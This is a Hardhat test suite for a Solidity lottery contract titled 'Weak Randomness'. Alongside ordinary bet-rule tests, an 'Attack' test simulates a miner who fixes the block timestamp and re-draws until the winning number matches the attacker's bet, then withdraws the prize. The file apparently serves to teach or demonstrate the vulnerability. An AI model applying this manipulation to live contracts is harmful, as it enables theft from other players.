const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Weak Randomness', () => {
    let deployer, attacker, user;
    beforeEach(async function () {
        [deployer, attacker, user] = await ethers.getSigners();
        const Lottery = await ethers.getContractFactory('Lottery', deployer);
        this.lottery = await Lottery.deploy();
    });

    describe('Lottery', () => {
        describe('With bets open', () => {
            it('Should allow a user to place a bet', async function () {
                await this.lottery.placeBet(5, { value: ethers.utils.parseEther('10') });
                expect(await this.lottery.bets(deployer.address)).to.eq(5);
            });
            it('Should revert if a user place more than 1 bet', async function () {
                await this.lottery.placeBet(5, { value: ethers.utils.parseEther('10') });
                await expect(this.lottery.placeBet(10, { value: ethers.utils.parseEther('10') })).to.revertedWith(
                    'Only 1 bet per player',
                );
            });
            it('Should revert if bet is not 10ether', async function () {
                await expect(this.lottery.placeBet(10, { value: ethers.utils.parseEther('5') })).to.revertedWith(
                    'Bet cost: 10ether',
                );
            });
            it('Should revert if bet is < 1', async function () {
                await expect(this.lottery.placeBet(0, { value: ethers.utils.parseEther('10') })).to.revertedWith(
                    'Must be a number from 1 to 255',
                );
            });
        });

        describe('With bets close', () => {
            it('Should revert if a user place a bet', async function () {
                await this.lottery.endLottery();
                await expect(this.lottery.placeBet(5, { value: ethers.utils.parseEther('10') })).to.revertedWith(
                    'Bet are closed',
                );
            });

            it('Should allow only the winner to withdraw the price', async function () {
                await this.lottery.connect(user).placeBet(5, { value: ethers.utils.parseEther('10') });
                await this.lottery.connect(attacker).placeBet(10, { value: ethers.utils.parseEther('10') });
                await this.lottery.connect(deployer).placeBet(15, { value: ethers.utils.parseEther('10') });

                let winningNumber;

                await this.lottery.endLottery();
                winningNumber = await this.lottery.winningNumber();

                console.log('fisrt', winningNumber);
                while (winningNumber !== 5) {
                    await this.lottery.endLottery();
                    winningNumber = await this.lottery.winningNumber();
                    console.log(winningNumber);
                }

                await expect(this.lottery.connect(attacker).withdrawPrice()).to.revertedWith('You are not the winner');

                const userInitBalance = await ethers.provider.getBalance(user.address);
                console.log('userInitBalance', ethers.utils.formatEther(userInitBalance));

                await this.lottery.connect(user).withdrawPrice();

                const userAfterWithdraw = await ethers.provider.getBalance(user.address);
                console.log('userAfterWithdraw', ethers.utils.formatEther(userAfterWithdraw));
            });
        });

        describe.only('Attack', () => {
            it('A minner cloud guess the number', async function () {
                await this.lottery.connect(user).placeBet(50, { value: ethers.utils.parseEther('10') });
                await this.lottery.connect(attacker).placeBet(5, { value: ethers.utils.parseEther('10') });
                await this.lottery.connect(deployer).placeBet(15, { value: ethers.utils.parseEther('10') });

                await ethers.provider.send('evm_setNextBlockTimestamp', [1652360989]);
                let winningNumber;

                await this.lottery.endLottery();
                winningNumber = await this.lottery.winningNumber();

                console.log('fisrt', winningNumber);
                while (winningNumber !== 5) {
                    await this.lottery.endLottery();
                    winningNumber = await this.lottery.winningNumber();
                    console.log(winningNumber);
                }
                console.log(await ethers.provider.getBlock('latest'));

                const attackerInitBalance = await ethers.provider.getBalance(attacker.address);
                await this.lottery.connect(attacker).withdrawPrice();

                const attackerFinal = await ethers.provider.getBalance(attacker.address);
                expect(attackerFinal).to.be.gt(attackerInitBalance);
            });
        });
    });
});
